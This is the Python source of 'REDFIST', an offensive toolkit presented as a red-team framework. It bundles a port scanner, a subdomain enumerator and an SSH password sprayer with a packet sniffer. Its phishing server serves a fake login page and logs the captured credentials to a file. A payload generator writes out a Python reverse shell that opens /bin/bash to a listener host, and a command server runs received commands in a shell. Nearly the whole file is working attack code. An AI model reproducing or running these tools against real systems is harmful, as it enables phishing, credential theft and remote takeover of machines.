#!/usr/bin/env python3
"""
REDFIST - Red Team Framework for Infrastructure Security Testing
A comprehensive red teaming toolset for authorized security testing
"""

import argparse
import requests
import threading
import socket
import subprocess
import os
import sys
import time
import random
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from http.server import HTTPServer, BaseHTTPRequestHandler

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings()

class RedFist:
    def __init__(self):
        self.banner()
        
    def banner(self):
        print("""
        ╔═╗┬─┐┌─┐┌─┐┌─┐┌─┐┌┬┐
        ╠╣ ├┬┘├─┤│  ├┤ │ ││││
        ╚  ┴└─┴ ┴└─┘└─┘└─┘┴ ┴_-7Fazo
        RED TEAM ASSAULT FRAMEWORK v1.0
        """)

    # MODULE 1: ADVANCED PORT SCANNER
    def port_scan(self, target, ports="1-1000", threads=100):
        """Advanced multi-threaded port scanner"""
        print(f"[+] Scanning {target} ports {ports} with {threads} threads")
        
        def scan_port(ip, port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    result = s.connect_ex((ip, port))
                    if result == 0:
                        try:
                            service = socket.getservbyport(port)
                        except:
                            service = "unknown"
                        print(f"[!] Port {port}/tcp open - {service}")
            except Exception as e:
                pass

        try:
            start_port, end_port = map(int, ports.split('-'))
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for port in range(start_port, end_port + 1):
                    executor.submit(scan_port, target, port)
                    
            print("[+] Port scan completed")
        except Exception as e:
            print(f"[-] Port scan error: {e}")

    # MODULE 2: SUBDOMAIN ENUMERATOR
    def subdomain_enum(self, domain, wordlist=None):
        """Subdomain enumeration tool"""
        print(f"[+] Enumerating subdomains for {domain}")
        
        if not wordlist:
            wordlist = "wordlists/common_subdomains.txt"
        
        subs_to_check = self.load_wordlist(wordlist)
        
        if not subs_to_check:
            print("[-] No subdomains to check")
            return []
        
        found_subs = []
        
        def check_subdomain(sub):
            subdomain = f"{sub}.{domain}".lower()
            for protocol in ['http', 'https']:
                url = f"{protocol}://{subdomain}"
                try:
                    response = requests.get(url, timeout=3, verify=False)
                    if response.status_code < 400:
                        print(f"[!] Found: {url} [{response.status_code}]")
                        found_subs.append(url)
                        break
                except requests.RequestException:
                    continue

        print(f"[+] Checking {len(subs_to_check)} subdomains...")
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(check_subdomain, subs_to_check)
        
        print(f"[+] Found {len(found_subs)} subdomains")
        return found_subs

    # MODULE 3: PASSWORD SPRAYER
    def password_spray(self, target, username_list, password, port=22):
        """SSH password spraying attack"""
        print(f"[+] Password spraying {target} with {len(username_list)} users")
        
        def try_ssh_login(ip, username, password, port):
            try:
                import paramiko
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port=port, username=username, password=password, timeout=5)
                print(f"[!] SUCCESS: {username}:{password}")
                ssh.close()
                return True
            except Exception as e:
                return False

        success_count = 0
        for username in username_list:
            if try_ssh_login(target, username, password, port):
                success_count += 1
            time.sleep(1)  # Rate limiting
        
        print(f"[+] {success_count} valid credentials found")

    # MODULE 4: NETWORK SNIFFER
    def network_sniff(self, interface=None, count=100):
        """Network packet sniffer"""
        print("[+] Starting network sniffer")
        try:
            from scapy.all import sniff, IP, TCP, UDP, DNS, DNSQR
        except ImportError:
            print("[-] Scapy not installed. Run: pip install scapy")
            return

        def packet_callback(packet):
            if IP in packet:
                ip_src = packet[IP].src
                ip_dst = packet[IP].dst
                
                info = ""
                if TCP in packet:
                    info = f"TCP {ip_src}:{packet[TCP].sport} -> {ip_dst}:{packet[TCP].dport}"
                elif UDP in packet:
                    info = f"UDP {ip_src}:{packet[UDP].sport} -> {ip_dst}:{packet[UDP].dport}"
                elif DNS in packet:
                    if DNSQR in packet:
                        info = f"DNS Query: {packet[DNSQR].qname.decode()}"
                
                if info:
                    print(f"[PACKET] {info}")

        try:
            sniff(iface=interface, prn=packet_callback, count=count)
        except Exception as e:
            print(f"[-] Sniffing error: {e}")

    # MODULE 5: HTTP SERVER FOR PHISHING
    def phishing_server(self, port=8080, redirect_url=None):
        """Phishing server for credential harvesting"""
        
        class PhishingHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/login':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    
                    phishing_page = """
                    <html>
                    <head><title>Secure Login</title></head>
                    <body style="font-family: Arial, sans-serif; max-width: 400px; margin: 100px auto; padding: 20px;">
                        <h2 style="color: #333;">Secure Login Portal</h2>
                        <form method="POST" style="background: #f9f9f9; padding: 20px; border-radius: 5px;">
                            <input type="text" name="username" placeholder="Username" style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px;"><br>
                            <input type="password" name="password" placeholder="Password" style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px;"><br>
                            <input type="submit" value="Login" style="background: #007cba; color: white; padding: 10px 20px; border: none; border-radius: 3px; cursor: pointer;">
                        </form>
                    </body>
                    </html>
                    """
                    self.wfile.write(phishing_page.encode())
                else:
                    self.send_response(302)
                    self.send_header('Location', '/login')
                    self.end_headers()

            def do_POST(self):
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode()
                parsed_data = urllib.parse.parse_qs(post_data)
                
                if 'username' in parsed_data and 'password' in parsed_data:
                    username = parsed_data['username'][0]
                    password = parsed_data['password'][0]
                    print(f"[!] CAPTURED CREDENTIALS: {username}:{password}")
                    
                    # Log to file
                    with open("credentials.txt", "a") as f:
                        f.write(f"{time.ctime()}: {username}:{password}\n")
                
                # Redirect after capture
                self.send_response(302)
                if redirect_url:
                    self.send_header('Location', redirect_url)
                else:
                    self.send_header('Location', '/login')
                self.end_headers()

            def log_message(self, format, *args):
                print(f"[HTTP] {args[0]} - {args[1]}")

        try:
            server = HTTPServer(('0.0.0.0', port), PhishingHandler)
            print(f"[+] Phishing server running on http://0.0.0.0:{port}")
            print("[!] Captured credentials will be saved to credentials.txt")
            server.serve_forever()
        except KeyboardInterrupt:
            print("\n[+] Server stopped")
        except Exception as e:
            print(f"[-] Server error: {e}")

    # MODULE 6: PAYLOAD GENERATOR
    def generate_payload(self, lhost, lport, payload_type="reverse_shell"):
        """Generate various payload types"""
        print(f"[+] Generating {payload_type.upper()} payload")
        
        if payload_type == "reverse_shell":
            # Python reverse shell
            payload = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
            
            print("\n[!] PYTHON REVERSE SHELL:")
            print("="*50)
            print(payload)
            print("="*50)
            
            # Save to file
            with open("payload.py", "w") as f:
                f.write(f"import socket,subprocess,os\n")
                f.write(f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n")
                f.write(f"s.connect((\"{lhost}\",{lport}))\n")
                f.write(f"os.dup2(s.fileno(),0)\n")
                f.write(f"os.dup2(s.fileno(),1)\n")
                f.write(f"os.dup2(s.fileno(),2)\n")
                f.write(f"import pty; pty.spawn(\"/bin/bash\")")
            
            print("\n[+] Payload saved as payload.py")
            
            # Generate one-liner
            with open("payload_oneliner.sh", "w") as f:
                f.write(payload)
            print("[+] One-liner saved as payload_oneliner.sh")

    # MODULE 7: C2 SERVER
    def c2_server(self, port=4444):
        """Command and Control server"""
        print(f"[+] Starting C2 server on port {port}")
        
        def handle_client(client_socket, address):
            try:
                print(f"[!] New connection from {address[0]}:{address[1]}")
                client_socket.send(b"REDFIST_C2> ")
                
                while True:
                    cmd = client_socket.recv(1024).decode().strip()
                    
                    if not cmd:
                        break
                    
                    if cmd.lower() == 'exit':
                        client_socket.send(b"Connection closed\n")
                        break
                    
                    # Execute command
                    try:
                        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
                        client_socket.send(output + b"\nREDFIST_C2> ")
                    except subprocess.TimeoutExpired:
                        client_socket.send(b"Command timed out\nREDFIST_C2> ")
                    except Exception as e:
                        client_socket.send(f"Error: {str(e)}\nREDFIST_C2> ".encode())
            except Exception as e:
                print(f"[-] Client handling error: {e}")
            finally:
                client_socket.close()
                print(f"[+] Connection closed: {address[0]}:{address[1]}")

        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(('0.0.0.0', port))
            server.listen(5)
            
            print(f"[+] C2 server listening on 0.0.0.0:{port}")
            print("[+] Waiting for connections...")
            
            while True:
                client, addr = server.accept()
                client_handler = threading.Thread(target=handle_client, args=(client, addr))
                client_handler.daemon = True
                client_handler.start()
                
        except KeyboardInterrupt:
            print("\n[+] C2 server stopped")
        except Exception as e:
            print(f"[-] C2 server error: {e}")
        finally:
            server.close()

    # UTILITY FUNCTIONS
    def load_wordlist(self, filename):
        """Load wordlist from file"""
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[-] Wordlist not found: {filename}")
            return []
        except Exception as e:
            print(f"[-] Error loading wordlist: {e}")
            return []

def main():
    parser = argparse.ArgumentParser(
        description="REDFIST - Red Team Framework for Infrastructure Security Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Port scanning
  python redfist.py scan 192.168.1.1 -p 1-1000 -t 50
  
  # Subdomain enumeration
  python redfist.py subdomains example.com
  
  # Generate reverse shell
  python redfist.py payload 192.168.1.100 4444
  
  # Start phishing server
  python redfist.py phish -p 8080
  
  # Start C2 server
  python redfist.py c2 -p 4444
        """
    )
    
    subparsers = parser.add_subparsers(dest='command', help='Commands')
    
    # Port scan command
    scan_parser = subparsers.add_parser('scan', help='Port scanning')
    scan_parser.add_argument('target', help='Target IP or hostname')
    scan_parser.add_argument('-p', '--ports', default='1-1000', help='Port range (default: 1-1000)')
    scan_parser.add_argument('-t', '--threads', type=int, default=100, help='Threads (default: 100)')
    
    # Subdomain enumeration
    sub_parser = subparsers.add_parser('subdomains', help='Subdomain enumeration')
    sub_parser.add_argument('domain', help='Target domain')
    sub_parser.add_argument('-w', '--wordlist', help='Custom wordlist file')
    
    # Password spray
    spray_parser = subparsers.add_parser('spray', help='Password spraying')
    spray_parser.add_argument('target', help='Target IP')
    spray_parser.add_argument('-u', '--users', required=True, help='Username list file')
    spray_parser.add_argument('-p', '--password', required=True, help='Password to spray')
    spray_parser.add_argument('--port', type=int, default=22, help='SSH port (default: 22)')
    
    # Network sniff
    sniff_parser = subparsers.add_parser('sniff', help='Network sniffing')
    sniff_parser.add_argument('-i', '--interface', help='Network interface')
    sniff_parser.add_argument('-c', '--count', type=int, default=100, help='Packet count')
    
    # Phishing server
    phishing_parser = subparsers.add_parser('phish', help='Start phishing server')
    phishing_parser.add_argument('-p', '--port', type=int, default=8080, help='Server port')
    phishing_parser.add_argument('-r', '--redirect', help='Redirect URL after capture')
    
    # Payload generator
    payload_parser = subparsers.add_parser('payload', help='Generate payload')
    payload_parser.add_argument('lhost', help='Listener IP')
    payload_parser.add_argument('lport', type=int, help='Listener port')
    payload_parser.add_argument('-t', '--type', default='reverse_shell', 
                               choices=['reverse_shell'], help='Payload type')
    
    # C2 Server
    c2_parser = subparsers.add_parser('c2', help='Start C2 server')
    c2_parser.add_argument('-p', '--port', type=int, default=4444, help='C2 port')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        return
    
    rf = RedFist()
    
    try:
        if args.command == 'scan':
            rf.port_scan(args.target, args.ports, args.threads)
        elif args.command == 'subdomains':
            rf.subdomain_enum(args.domain, args.wordlist)
        elif args.command == 'spray':
            users = rf.load_wordlist(args.users)
            if users:
                rf.password_spray(args.target, users, args.password, args.port)
        elif args.command == 'sniff':
            rf.network_sniff(args.interface, args.count)
        elif args.command == 'phish':
            rf.phishing_server(args.port, args.redirect)
        elif args.command == 'payload':
            rf.generate_payload(args.lhost, args.lport, args.type)
        elif args.command == 'c2':
            rf.c2_server(args.port)
    except KeyboardInterrupt:
        print("\n[+] Operation cancelled by user")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
